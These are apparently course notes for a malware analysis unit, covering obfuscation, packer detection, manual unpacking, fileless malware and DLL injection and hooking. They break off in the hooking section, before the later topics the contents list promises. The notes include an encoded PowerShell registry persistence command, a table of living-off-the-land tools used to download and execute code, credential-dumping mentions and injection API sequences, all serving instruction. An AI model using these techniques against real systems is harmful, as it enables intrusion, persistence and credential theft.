# Unit 4: In-Depth Malware Analysis

> **Course**: Reverse Engineering and Malware Analysis (REMA)
> **Unit**: 4 - In-Depth Malware Analysis

---

## Table of Contents

1. [[#1. Malware Obfuscation Fundamentals]]
2. [[#2. Recognizing Packed Malware]]
3. [[#3. Getting Started with Unpacking]]
4. [[#4. Using Debuggers for Dumping Packed Malware]]
5. [[#5. Analyzing Multi-Technology and Fileless Malware]]
6. [[#6. Code Injection and API Hooking]]
7. [[#7. Using Memory Forensics for Malware Analysis]]
8. [[#8. Advanced JavaScript De-obfuscation]]
9. [[#9. Advanced PDF Document Analysis]]
10. [[#10. Advanced Office Document Analysis]]

---

## 1. Malware Obfuscation Fundamentals

### 1.1 What is Obfuscation?

> **Definition**: **Obfuscation** is the process of making code or data difficult to understand while preserving its original functionality. An **obfuscator** is a tool that converts simple source code into a program that performs the same function but is significantly harder to read and analyze.

#### Legitimate Uses of Obfuscation
- Protecting intellectual property
- Safeguarding trade secrets
- Preventing reverse engineering of proprietary software
- Securing sensitive algorithms

#### Malicious Uses of Obfuscation
- Evading antivirus detection
- Hiding malicious strings and indicators
- Delaying analysis by security researchers
- Concealing command-and-control (C2) infrastructure

### 1.2 Why Malware Authors Use Obfuscation

```
┌─────────────────────────────────────────────────────────┐
│           MALWARE OBFUSCATION OBJECTIVES                 │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  1. EVADE DETECTION                                      │
│     └── Bypass signature-based antivirus                │
│     └── Avoid pattern matching                          │
│     └── Defeat static analysis tools                    │
│                                                          │
│  2. DELAY ANALYSIS                                       │
│     └── Increase time required for reverse engineering  │
│     └── Discourage casual analysis                      │
│     └── Protect malware infrastructure                  │
│                                                          │
│  3. HIDE INDICATORS                                      │
│     └── Conceal registry keys                           │
│     └── Mask C2 URLs and IP addresses                   │
│     └── Encrypt configuration data                       │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### 1.3 Obfuscation Techniques Overview

#### 1.3.1 Dead-Code Insertion

> **Definition**: **Dead-code insertion** changes the appearance of a program by adding instructions that have no effect on program functionality.

**Common Implementation**: NOP (No Operation) Instructions

```assembly
; Original Code
MOV EAX, 5
ADD EAX, 3

; With Dead-Code Insertion
MOV EAX, 5
NOP              ; Does nothing
NOP              ; Does nothing
ADD EAX, 3
NOP              ; Does nothing
```

**Characteristics**:
- Simple to implement
- Easy to detect and remove
- Often combined with other techniques
- Signature-based scanners can strip NOPs before analysis

---

#### 1.3.2 XOR Encoding

> **Definition**: **XOR encoding** is a symmetric cipher that conceals data by applying the XOR operation. Applying XOR twice with the same key restores the original value.

**Mathematical Property**: `A XOR B XOR B = A`

```assembly
; XOR-based register swapping (obfuscation technique)
XOR EBX, EAX    ; EBX = EBX XOR EAX
XOR EAX, EBX    ; EAX = original EBX
XOR EBX, EAX    ; EBX = original EAX

; XOR string decryption example
; Encrypted: 0x48, 0x45, 0x4C, 0x4C, 0x4F (XOR with 0x00 = "HELLO")
; With key 0x41:
; 0x09, 0x04, 0x0D, 0x0D, 0x0E (XOR with 0x41 = "HELLO")
```

**Detection Indicators**:
- Repeated XOR operations in code
- Single-byte or multi-byte key patterns
- Loops processing byte arrays with XOR

---

#### 1.3.3 Register Reassignment

> **Definition**: **Register reassignment** substitutes registers from one malware variant to another while maintaining identical program behavior.

```assembly
; Original Variant
MOV EAX, [data]
ADD EAX, 10
MOV [result], EAX

; Reassigned Variant (same functionality)
MOV EBX, [data]
ADD EBX, 10
MOV [result], EBX
```

**Limitation**: Wildcard searching can defeat this technique

---

#### 1.3.4 Subroutine Reordering

> **Definition**: **Subroutine reordering** randomizes the arrangement of program subroutines while using jumps to maintain correct execution flow.

**Variation Potential**: n! permutations (where n = number of subroutines)

```
Original Order:          Reordered:
┌──────────────┐         ┌──────────────┐
│ Function A   │         │ Function C   │
├──────────────┤         ├──────────────┤
│ Function B   │   →     │ JMP to A     │
├──────────────┤         ├──────────────┤
│ Function C   │         │ Function A   │
└──────────────┘         ├──────────────┤
                         │ Function B   │
                         └──────────────┘
```

---

#### 1.3.5 Instruction Substitution

> **Definition**: **Instruction substitution** replaces instructions with functionally equivalent alternatives.

| Original Instruction | Substituted Equivalent |
|---------------------|------------------------|
| `ADD EAX, 1` | `INC EAX` |
| `SUB EAX, 1` | `DEC EAX` |
| `MOV EAX, 0` | `XOR EAX, EAX` |
| `CMP EAX, 0` | `TEST EAX, EAX` |
| `MUL EAX, 2` | `SHL EAX, 1` |

---

#### 1.3.6 Code Transposition

> **Definition**: **Code transposition** reorders instruction sequences without affecting program behavior.

**Two Methods**:

| Method | Description | Complexity |
|--------|-------------|------------|
| **Random Shuffle + Jumps** | Shuffles instructions, uses unconditional jumps to restore order | Low (easily reversed) |
| **Independent Instruction Reordering** | Identifies and reorders instructions with no dependencies | High (complex to analyze) |

```assembly
; Original
MOV EAX, 5      ; Instruction 1
MOV EBX, 10     ; Instruction 2 (independent of 1)
ADD EAX, EBX    ; Instruction 3 (depends on 1 and 2)

; Transposed (valid because 1 and 2 are independent)
MOV EBX, 10     ; Instruction 2
MOV EAX, 5      ; Instruction 1
ADD EAX, EBX    ; Instruction 3
```

---

#### 1.3.7 Code Integration

> **Definition**: **Code integration** (first seen in Zmist/Win95 virus) decompiles a target program into segments, inserts malicious code between them, and reassembles into a new variant.

**Process Flow**:
```
┌─────────────────────────────────────────────────────────┐
│              CODE INTEGRATION PROCESS                    │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  1. Decompile target program into manageable segments   │
│                          ↓                               │
│  2. Analyze segment boundaries and dependencies         │
│                          ↓                               │
│  3. Insert malicious code between segments              │
│                          ↓                               │
│  4. Reassemble into functional hybrid executable        │
│                          ↓                               │
│  5. Result: Malware "woven" into legitimate code        │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

---

#### 1.3.8 Base64 Encoding

> **Definition**: **Base64** is a 64-character encoding scheme that converts binary data to ASCII text, commonly used to obfuscate strings and payloads.

**Character Set**: `A-Z`, `a-z`, `0-9`, `+`, `/` (padding: `=`)

**How Base64 Works**:
```
1. Take 3 bytes (24 bits) of data
2. Divide into four groups of 6 bits
3. Map each 6-bit group to a Base64 character

Example:
"Man" → 77 97 110 (ASCII)
      → 01001101 01100001 01101110 (binary)
      → 010011 010110 000101 101110 (6-bit groups)
      → T      W      F      u     (Base64)
Result: "TWFu"
```

**Detection**:
- Strings ending with `=` or `==`
- Character set limited to Base64 alphabet
- Length is multiple of 4

---

## 2. Recognizing Packed Malware

### 2.1 What is Packing?

> **Definition**: **Packing** is a subset of obfuscation where a tool compresses or encrypts an executable, wrapping it with a decompression/decryption stub that restores the original code at runtime.

#### Legitimate Uses
- Reducing executable file size
- Protecting intellectual property
- Software licensing protection

#### Malicious Uses
- Evading signature-based detection
- Hiding malware indicators
- Complicating static analysis

### 2.2 The Packing Process

```
┌─────────────────────────────────────────────────────────┐
│                  PACKING PROCESS                         │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  ORIGINAL EXECUTABLE                                     │
│  ┌──────────────────────────────────────────────────┐   │
│  │  Original PE Header                               │   │
│  ├──────────────────────────────────────────────────┤   │
│  │  .text (code)                                     │   │
│  ├──────────────────────────────────────────────────┤   │
│  │  .data (data)                                     │   │
│  ├──────────────────────────────────────────────────┤   │
│  │  Import Address Table (IAT)                       │   │
│  └──────────────────────────────────────────────────┘   │
│                          ↓                               │
│                    PACKER TOOL                           │
│                          ↓                               │
│  PACKED EXECUTABLE                                       │
│  ┌──────────────────────────────────────────────────┐   │
│  │  New PE Header                                    │   │
│  ├──────────────────────────────────────────────────┤   │
│  │  Packed Section(s)                                │   │
│  │  (Compressed/Encrypted original code + data)     │   │
│  ├──────────────────────────────────────────────────┤   │
│  │  Decompression Stub                               │   │
│  │  (Unpacks code at runtime)                        │   │
│  └──────────────────────────────────────────────────┘   │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### 2.3 Key Packing Concepts

| Term | Definition |
|------|------------|
| **Stub** | Small code portion containing decompression/decryption routine |
| **Original Entry Point (OEP)** | Address where original program begins execution |
| **Packed Section** | Compressed/encrypted original code and data |
| **Import Address Table (IAT)** | Table of addresses for imported DLL functions |

### 2.4 Popular Packers

| Packer | Type | Description |
|--------|------|-------------|
| **UPX** | Open Source | Ultimate Packer for eXecutables; widely used, easily unpacked |
| **Themida** | Commercial | Advanced protection with VM-based obfuscation |
| **VMProtect** | Commercial | Virtualizes code sections; very difficult to analyze |
| **The Enigma Protector** | Commercial | Licensing and protection suite |
| **Obsidium** | Commercial | Anti-debugging and anti-tampering features |
| **MPRESS** | Free | Lightweight packer for PE files |
| **Exe Packer 2.300** | Free | Simple compression packer |
| **ExeStealth** | Commercial | Designed specifically for malware protection |

### 2.5 Static Detection of Packed Files

#### 2.5.1 Entropy Analysis

> **Definition**: **Entropy** is a measure of randomness/disorder in data. Compressed or encrypted data has high entropy because it appears random.

**Shannon Entropy Formula**:
```
H(X) = -Σ p(x) * log₂(p(x))
```

**Entropy Scale** (for binary files):
| Entropy Level | Interpretation |
|---------------|----------------|
| 0 | Uniform data (e.g., all zeros) |
| < 5 | Likely uncompressed, readable |
| 5 - 7 | Possibly compressed or partially encrypted |
| **≥ 7** | **High probability of packing/encryption** |
| 8 | Maximum randomness |

```
┌─────────────────────────────────────────────────────────┐
│              ENTROPY VISUALIZATION                       │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  Normal Executable:                                      │
│  ├── .text section:  ~6.0 entropy                       │
│  ├── .data section:  ~4.5 entropy                       │
│  └── .rsrc section:  ~5.0 entropy                       │
│                                                          │
│  Packed Executable:                                      │
│  ├── UPX0 section:   ~7.8 entropy  ← HIGH!              │
│  ├── UPX1 section:   ~7.5 entropy  ← HIGH!              │
│  └── .rsrc section:  ~5.0 entropy                       │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

#### 2.5.2 Suspicious Section Names

| Normal Section Names | Packed/Suspicious Names |
|---------------------|-------------------------|
| `.text` | `UPX0`, `UPX1` |
| `.data` | `.aspack` |
| `.rdata` | `.themida` |
| `.rsrc` | `.vmp0`, `.vmp1` |
| `.reloc` | Random characters |

#### 2.5.3 Small/Minimal Import Table

**Normal executables**: Import many functions from multiple DLLs

**Packed executables**: Often import only:
- `LoadLibraryA` / `LoadLibraryW`
- `GetProcAddress`

These are used to dynamically resolve other functions at runtime.

#### 2.5.4 Unusual Entry Point Location

| Normal | Suspicious |
|--------|------------|
| Entry point in `.text` section | Entry point in last section |
| | Entry point in unknown section |
| | Entry point at very high address |

#### 2.5.5 Missing or Garbled Strings

**Normal executable**: Contains readable strings (file paths, URLs, error messages)

**Packed executable**:
- Very few readable strings
- Strings appear as garbage
- No identifiable patterns

### 2.6 Detection Tools

| Tool | Description |
|------|-------------|
| **PEiD** | Classic packer identifier (signature-based) |
| **Detect It Easy (DiE)** | Modern packer/compiler detector |
| **PEstudio** | Comprehensive PE analysis with entropy |
| **CFF Explorer** | PE header analysis and editing |
| **Exeinfo PE** | Packer and compiler detection |
| **pestudio** | First-stage malware triage tool |

#### Using Detect It Easy

```
┌─────────────────────────────────────────────────────────┐
│                  DiE ANALYSIS OUTPUT                     │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  File: suspicious.exe                                    │
│                                                          │
│  Packer: UPX 3.96                                        │
│  Entropy: 7.82 (Packed)                                  │
│                                                          │
│  Sections:                                               │
│  ┌────────┬─────────┬─────────┬─────────────┐           │
│  │ Name   │ VSize   │ RSize   │ Entropy     │           │
│  ├────────┼─────────┼─────────┼─────────────┤           │
│  │ UPX0   │ 0x10000 │ 0x0     │ 0.00        │           │
│  │ UPX1   │ 0x5000  │ 0x4800  │ 7.82 ←HIGH  │           │
│  │ UPX2   │ 0x1000  │ 0x200   │ 3.21        │           │
│  └────────┴─────────┴─────────┴─────────────┘           │
│                                                          │
│  Imports: 2 functions                                    │
│  - KERNEL32.dll: LoadLibraryA, GetProcAddress           │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

---

## 3. Getting Started with Unpacking

### 3.1 Unpacking Overview

> **Definition**: **Unpacking** is the process of extracting the original executable from a packed file, either manually or using automated tools.

### 3.2 Unpacking Methods

```
┌─────────────────────────────────────────────────────────┐
│                 UNPACKING APPROACHES                     │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  ┌─────────────────────┐  ┌─────────────────────────┐   │
│  │  AUTOMATIC          │  │  MANUAL                  │   │
│  │  UNPACKING          │  │  UNPACKING               │   │
│  ├─────────────────────┤  ├─────────────────────────┤   │
│  │ • Use dedicated     │  │ • Debug and trace       │   │
│  │   unpackers         │  │   execution             │   │
│  │ • Quick for known   │  │ • Find OEP manually     │   │
│  │   packers           │  │ • Dump memory           │   │
│  │ • May fail on       │  │ • Rebuild IAT           │   │
│  │   custom packers    │  │ • Fix PE headers        │   │
│  └─────────────────────┘  └─────────────────────────┘   │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### 3.3 Automatic Unpacking

#### For UPX-Packed Files

```bash
# Unpack UPX-compressed executable
upx -d packed_file.exe -o unpacked_file.exe

# Verify unpacking
upx -t unpacked_file.exe
```

#### Generic Unpackers

| Tool | Description |
|------|-------------|
| **UPX** | Built-in decompression for UPX files |
| **RL!dePacker** | Universal unpacker for common packers |
| **QuickUnpack** | Generic unpacker with IAT rebuilding |
| **GUnPacker** | Generic unpacker supporting multiple formats |

### 3.4 Manual Unpacking Process

```
┌─────────────────────────────────────────────────────────┐
│              MANUAL UNPACKING WORKFLOW                   │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  Step 1: LOAD IN DEBUGGER                               │
│          └── Load packed executable in x64dbg/OllyDbg   │
│                          ↓                               │
│  Step 2: FIND UNPACKING ROUTINE                         │
│          └── Identify decompression stub                │
│          └── Set breakpoints on key APIs                │
│                          ↓                               │
│  Step 3: LOCATE OEP (Original Entry Point)              │
│          └── Trace execution after unpacking            │
│          └── Look for jump to unpacked code             │
│                          ↓                               │
│  Step 4: DUMP MEMORY                                    │
│          └── Dump process memory at OEP                 │
│          └── Use tools like Scylla or OllyDump          │
│                          ↓                               │
│  Step 5: REBUILD IAT                                    │
│          └── Fix Import Address Table                   │
│          └── Resolve function addresses                 │
│                          ↓                               │
│  Step 6: FIX PE HEADERS                                 │
│          └── Correct entry point                        │
│          └── Fix section alignments                     │
│                          ↓                               │
│  Step 7: VERIFY UNPACKED FILE                           │
│          └── Test execution                             │
│          └── Verify strings and imports visible         │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### 3.5 Finding the Original Entry Point (OEP)

#### Common OEP Indicators

| Indicator | Description |
|-----------|-------------|
| **PUSHAD/POPAD** | Saves/restores registers; OEP often follows POPAD |
| **Long JMP** | Jump to distant address (unpacked code region) |
| **Stack change** | ESP restored to original value |
| **API resolution** | After GetProcAddress loop completes |

#### Technique: Hardware Breakpoint on ESP

```
1. At entry point, note ESP value
2. Set hardware breakpoint on memory access at [ESP]
3. Run program
4. Breakpoint triggers when stub restores stack
5. OEP is typically near this location
```

---

## 4. Using Debuggers for Dumping Packed Malware

### 4.1 Introduction to Debugging

> **Definition**: A **debugger** is a tool that allows developers and researchers to follow and control program execution, inspect registers, memory, and the stack, and observe how each instruction affects stored data.

### 4.2 Popular Debuggers for Malware Analysis

| Debugger | Description | Use Case |
|----------|-------------|----------|
| **x64dbg/x32dbg** | Modern, user-friendly, actively maintained | Primary choice for Windows malware |
| **OllyDbg** | Classic debugger (no longer maintained) | Legacy, still useful |
| **WinDbg** | Microsoft's kernel and user-mode debugger | Kernel debugging, crash analysis |
| **IDA Pro Debugger** | Integrated with IDA disassembler | Advanced analysis |
| **Immunity Debugger** | Python-scriptable debugger | Exploit development |

### 4.3 x64dbg Interface Overview

```
┌─────────────────────────────────────────────────────────┐
│                   x64dbg LAYOUT                          │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  ┌─────────────────────┬────────────────────────────┐   │
│  │   DISASSEMBLY       │       REGISTERS            │   │
│  │   View assembly     │       EAX, EBX, ECX...     │   │
│  │   instructions      │       EIP, ESP, EBP        │   │
│  │                     │       Flags (ZF, CF...)    │   │
│  ├─────────────────────┼────────────────────────────┤   │
│  │   DUMP              │       STACK                │   │
│  │   Memory hex view   │       Current stack        │   │
│  │   Data inspection   │       contents             │   │
│  └─────────────────────┴────────────────────────────┘   │
│                                                          │
│  Toolbar: Run | Pause | Step Into | Step Over | ...     │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### 4.4 Essential Debugging Commands

| Action | x64dbg Shortcut | Description |
|--------|-----------------|-------------|
| **Step Into** | F7 | Execute one instruction, follow calls |
| **Step Over** | F8 | Execute one instruction, skip calls |
| **Run** | F9 | Continue execution |
| **Run to Selection** | F4 | Run until selected instruction |
| **Set Breakpoint** | F2 | Toggle breakpoint at cursor |
| **Go to Address** | Ctrl+G | Navigate to specific address |

### 4.5 Dynamic Unpacking Indicators

#### Key API Calls to Monitor

| API Function | Purpose | Significance |
|--------------|---------|--------------|
| `VirtualAlloc` | Allocate memory | Creates space for unpacked code |
| `VirtualProtect` | Change memory permissions | Makes memory executable |
| `RtlDecompressBuffer` | Decompress data | Direct decompression API |
| `CreateProcessInternalW` | Create new process | May create new process with unpacked code |
| `WriteProcessMemory` | Write to process memory | Inject unpacked code |
| `LoadLibraryA/W` | Load DLL | Resolve dependencies dynamically |
| `GetProcAddress` | Get function address | Build IAT at runtime |

#### Setting API Breakpoints in x64dbg

```
1. Open "Symbols" tab (Ctrl+Shift+S)
2. Find kernel32.dll
3. Search for VirtualAlloc
4. Right-click → "Toggle Breakpoint"
5. Run program (F9)
6. Debugger breaks when API is called
7. Inspect parameters:
   - lpAddress: Where to allocate
   - dwSize: Size (indicates payload size)
   - flProtect: Protection flags
```

### 4.6 Memory Dumping Process

#### Step-by-Step Dumping with Scylla

```
┌─────────────────────────────────────────────────────────┐
│              MEMORY DUMPING WITH SCYLLA                  │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  1. DEBUG TO OEP                                         │
│     - Trace execution to Original Entry Point           │
│     - Verify you're at unpacked code                    │
│                                                          │
│  2. OPEN SCYLLA (x64dbg plugin)                         │
│     - Plugins → Scylla                                  │
│     - Or standalone Scylla tool                         │
│                                                          │
│  3. CONFIGURE DUMP                                       │
│     - OEP: Enter OEP address found during debugging     │
│     - Click "IAT Autosearch"                            │
│     - Click "Get Imports"                               │
│                                                          │
│  4. DUMP PROCESS                                         │
│     - Click "Dump"                                      │
│     - Save as new PE file                               │
│                                                          │
│  5. FIX IAT                                              │
│     - Click "Fix Dump"                                  │
│     - Select dumped file                                │
│     - Creates final unpacked executable                 │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### 4.7 Common Unpacking Challenges

| Challenge | Solution |
|-----------|----------|
| **Anti-debugging** | Use plugins (ScyllaHide, TitanHide) |
| **VM detection** | Modify VM artifacts, use physical machine |
| **Timing checks** | Patch timing functions or step carefully |
| **Stolen bytes** | Manually reconstruct entry point |
| **Multiple layers** | Repeat unpacking process for each layer |
| **Virtualized code** | Use specialized tools (VMUnprotector) |

---

## 5. Analyzing Multi-Technology and Fileless Malware

### 5.1 What is Fileless Malware?

> **Definition**: **Fileless malware** is malicious activity that uses native, legitimate tools built into a system to execute attacks. Unlike traditional malware, fileless malware doesn't require installing executable files on disk, making it extremely difficult to detect.

**Also Known As**: Living Off the Land (LOLBins/LOLBas)

### 5.2 Why Fileless Malware is Dangerous

```
┌─────────────────────────────────────────────────────────┐
│           FILELESS MALWARE ADVANTAGES                    │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  FOR ATTACKERS:                                          │
│  ├── No files to detect by antivirus                   │
│  ├── Uses trusted system tools (whitelisted)           │
│  ├── Leaves minimal forensic evidence                  │
│  ├── Difficult to attribute                             │
│  └── Survives traditional incident response            │
│                                                          │
│  CHALLENGES FOR DEFENDERS:                               │
│  ├── Signature-based detection ineffective             │
│  ├── Normal tools behaving abnormally                  │
│  ├── Evidence exists only in memory                    │
│  └── Traditional forensics insufficient                │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### 5.3 Fileless Attack Techniques

#### 5.3.1 Exploit Kits

- Exploit browser or plugin vulnerabilities
- Execute code directly in memory
- No malware file written to disk

#### 5.3.2 Hijacked Native Tools (LOLBins)

**Common Living-Off-the-Land Binaries**:

| Tool | Malicious Use |
|------|---------------|
| **PowerShell** | Download and execute scripts, C2 communication |
| **WMI** | Persistence, lateral movement |
| **WMIC** | Execute commands remotely |
| **MSBuild** | Compile and execute inline code |
| **Regsvr32** | Download and execute SCT files |
| **Mshta** | Execute HTA files with VBScript/JScript |
| **Certutil** | Download files (encoded/decoded) |
| **Rundll32** | Execute DLL functions |
| **CMSTP** | UAC bypass, execute INF files |

#### 5.3.3 Registry-Resident Malware

```
┌─────────────────────────────────────────────────────────┐
│           REGISTRY-BASED PERSISTENCE                     │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  Malware encoded in registry values:                    │
│                                                          │
│  HKCU\Software\Microsoft\Windows\CurrentVersion\Run    │
│  └── "Update" = "powershell -ep bypass -enc [BASE64]"  │
│                                                          │
│  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\    │
│  └── Image File Execution Options\notepad.exe          │
│      └── Debugger = "malicious.exe"                    │
│                                                          │
│  HKCU\Software\Classes\CLSID\{GUID}\InprocServer32     │
│  └── Default = "C:\malicious.dll"                      │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

#### 5.3.4 Memory-Only Malware

- Payload exists only in RAM
- Injected into legitimate processes
- Lost on system reboot (unless persistence established separately)

#### 5.3.5 Fileless Ransomware

- Encryption routines executed in memory
- May use PowerShell to download and execute
- Keys and payloads never touch disk

#### 5.3.6 Stolen Credentials

- Credential dumping tools running in memory
- Pass-the-hash/Pass-the-ticket attacks
- No malware files required

### 5.4 Stages of a Fileless Attack

```
┌─────────────────────────────────────────────────────────┐
│             FILELESS ATTACK CHAIN                        │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  STAGE 1: GAIN ACCESS                                    │
│  ├── Exploit vulnerability (browser, Flash, etc.)       │
│  ├── Spear-phishing with macro document                │
│  └── Web shell deployment (China Chopper)              │
│                          ↓                               │
│  STAGE 2: STEAL CREDENTIALS                              │
│  ├── Mimikatz (in-memory execution)                    │
│  ├── LSASS memory dumping                              │
│  └── Credential harvesting from browsers               │
│                          ↓                               │
│  STAGE 3: MAINTAIN PERSISTENCE                          │
│  ├── Registry modifications                             │
│  ├── WMI event subscriptions                           │
│  ├── Scheduled tasks with encoded payloads             │
│  └── Sticky Keys bypass (accessibility features)       │
│                          ↓                               │
│  STAGE 4: EXFILTRATE DATA                               │
│  ├── PowerShell file compression                       │
│  ├── Built-in FTP/BITS for upload                      │
│  └── DNS tunneling for data exfiltration              │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

### 5.5 Detecting Fileless Malware

#### Indicators of Attack (IoA) vs Indicators of Compromise (IoC)

| Feature | IoC (Indicators of Compromise) | IoA (Indicators of Attack) |
|---------|-------------------------------|---------------------------|
| **Focus** | Evidence of breach | Attacker behavior |
| **Timing** | After attack | During attack |
| **Detection Type** | Signature-based | Behavior-based |
| **Examples** | File hashes, IPs, domains | Process injection, privilege escalation |

#### Key IoAs for Fileless Malware

| Indicator | Description |
|-----------|-------------|
| **Process injection** | Code injected into explorer.exe, svchost.exe |
| **Unusual PowerShell** | Encoded commands, download cradles |
| **Privilege escalation** | Unexpected elevation attempts |
| **Lateral movement** | WMI/PSExec to other systems |
| **Credential dumping** | Access to LSASS memory |
| **Suspicious parent-child** | Word spawning PowerShell |

### 5.6 Fileless Malware Detection Tools

| Tool | Purpose |
|------|---------|
| **Sysmon** | System Monitor - logs process creation, network connections |
| **Process Monitor** | Real-time process, registry, file system monitoring |
| **PowerShell Script Block Logging** | Log all PowerShell commands |
| **Windows Event Forwarding** | Centralize security logs |
| **EDR Solutions** | Endpoint Detection and Response |

---

## 6. Code Injection and API Hooking

### 6.1 Understanding API Hooking

> **Definition**: **API hooking** is a technique for intercepting and potentially modifying calls to system APIs. It allows code to inspect, modify, or redirect function calls.

#### Legitimate Uses
- Debugging and profiling
- Security software (AV/EDR)
- Application compatibility layers
- Monitoring tools

#### Malicious Uses
- Hiding malware presence
- Stealing credentials
- Intercepting network traffic
- Bypassing security software

### 6.2 Injection vs Hooking

| Concept | Description |
|---------|-------------|
| **Injection** | Running code in another process's address space |
| **Hooking** | Intercepting function calls to monitor or modify behavior |

### 6.3 DLL Injection Techniques

#### 6.3.1 SetWindowsHookEx

> **Definition**: `SetWindowsHookEx` installs a hook procedure into a hook chain to monitor system events (keyboard, mouse, messages).

**Famous Use Case**: Keyloggers

```
┌─────────────────────────────────────────────────────────┐
│           SetWindowsHookEx INJECTION                     │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  1. Create malicious DLL with exported hook function    │
│                                                          │
│  2. Load DLL using LoadLibrary                          │
│                                                          │
│  3. Get hook function address with GetProcAddress       │
│                                                          │
│  4. Call SetWindowsHookEx:                              │
│     - idHook: WH_KEYBOARD (keylogger)                   │
│     - lpfn: Address of hook function                    │
│     - hMod: Handle to DLL                               │
│     - dwThreadId: 0 (all threads)                       │
│                                                          │
│  5. DLL injected into all processes receiving events    │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

**Hook Types**:
| Hook ID | Purpose |
|---------|---------|
| `WH_KEYBOARD` | Monitor keyboard input |
| `WH_KEYBOARD_LL` | Low-level keyboard hook |
| `WH_MOUSE` | Monitor mouse input |
| `WH_GETMESSAGE` | Monitor posted messages |

#### 6.3.2 CreateRemoteThread Injection

```
┌─────────────────────────────────────────────────────────┐
│       CreateRemoteThread DLL INJECTION                   │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  1. OpenProcess (PROCESS_ALL_ACCESS)                    │
│     └── Get handle to target process                    │
│                                                          │
│  2. VirtualAllocEx                                       │
│     └── Allocate memory in target for DLL path          │
│                                                          │
│  3. WriteProcessMemory                                   │
│     └── Write DLL path to allocated memory              │
│                                                          │
│  4. GetProcAddress (LoadLibraryA)                       │
│     └── Get address of LoadLibrary                      │
│                                                          │
│  5. CreateRemoteThread                                   │
│     └── Create thread in target calling LoadLibrary    │
│     └── Argument: pointer to DLL path                  │
│                                                          │
│  6. DLL loaded and executing in target process          │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

#### 6.3.3 Code Injection (Shellcode)

Direct injection of code without DLL file:

1. `VirtualAllocEx` - Allocate executable memory
2. `WriteProcessMemory` - Write shellcode
3. `CreateRemoteThread` - Execute injected code

### 6.4 API Hooking Techniques

#### 6.4.1 IAT Hooking (Import Address Table)

> **Definition**: **IAT hooking** modifies entries in a process's Import Address Table to redirect function calls to hook functions.

```
┌─────────────────────────────────────────────────────────┐
│                  IAT HOOKING                             │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  BEFORE HOOKING:                                         │
│  ┌─────────────────────────────────────────────────┐    │
│  │  IAT Entry for MessageBoxA                       │    │
│  │  Address: 0x7FFE1234 (real MessageBoxA)         │    │
│  └─────────────────────────────────────────────────┘    │
│                                                          │
│  AFTER HOOKING:                                          │
│  ┌─────────────────────────────────────────────────┐    │
│  │  IAT Entry for MessageBoxA                       │    │
│  │  Address: 0x10001000 (hook function)            │    │
│  └─────────────────────────────────────────────────┘    │
│                          │                               │
│                          ▼                               │
│  ┌─────────────────────────────────────────────────┐    │
│  │  Hook Function:                                  │    │
│  │  - Log parameters                               │    │
│  │  - Modify parameters                            │    │
│  │  - Call real MessageBoxA (0x7FFE1234)          │    │
│  │  - Return result                                │    │
│  └─────────────────────────────────────────────────┘    │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

**Limitation**: Doesn't work if target uses dynamic linking (LoadLibrary/GetProcAddress)

#### 6.4.2 Inline Hooking (Detours)

> **Definition**: **Inline hooking** overwrites the beginning of a target function with a jump to a hook function.

```
┌─────────────────────────────────────────────────────────┐
│                 INLINE HOOKING                           │
├─────────────────────────────────────────────────────────┤
│                                                          │
│  ORIGINAL FUNCTION:                                      │
│  ┌─────────────────────────────────────────────────┐    │
│  │  MessageBoxA:                                    │    │
│  │  8B FF        MOV EDI, EDI                      │    │
│  │  55           PUSH EBP                          │    │
│  │  8B EC        MOV EBP, ESP                      │    │
│  │  ...          (rest of function)                │    │
│  └─────────────────────────────────────────────────┘    │
│                                                          │
│  HOOKED FUNCTION:                                        │
│  ┌─────────────────────────────────────────────────┐    │
│  │  MessageBoxA:                                    │    │
│  │  E9 XX XX XX XX   JMP HookFunction             │    │
│  │  90               NOP (padding)                 │    │
│  │  ...              (rest of function)            │    │
│  └─────────────────────────────────────────────────┘    │
│                          │                               │
│                          ▼                               │
│  ┌─────────────────────────────────────────────────┐    │
│  │  HookFunction (Detour):                          │    │
│  │  - Execute hook code                            │    │
│  │  - Call Trampoline                              │    │
│  └─────────────────────────────────────────────────┘    │
│                          │                               │
│                          ▼                               │
│  ┌─────────────────────────────────────────────────┐    │
│  │  Trampoline:                                     │    │
│  │  8B FF        MOV EDI, EDI (stolen bytes)       │    │
│  │  55           PUSH EBP                          │    │
│  │  8B EC        MOV EBP, ESP                      │    │
│  │  E9 XX XX XX  JMP MessageBoxA+5                 │    │
│  └─────────────────────────────────────────────────┘    │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

#### 6.4.3 IDT Hooking (Interrupt Descriptor Table)

> **Definition**: **IDT hooking** modifies the Interrupt Descriptor Table to intercept interrupts and redirect them to malicious handlers.

- Requires kernel-mode access
- Each CPU core has its own IDT
- Uses SIDT (Store IDT) and LIDT (Load IDT) instructions

#### 6.4.4 SYSENTER Hooking

> **Definition**: **SYSENTER hooking** modifies the SYSENTER_EIP MSR register to intercept system calls.

- SYSENTER provides fast kernel entry (replacing INT 0x2e)
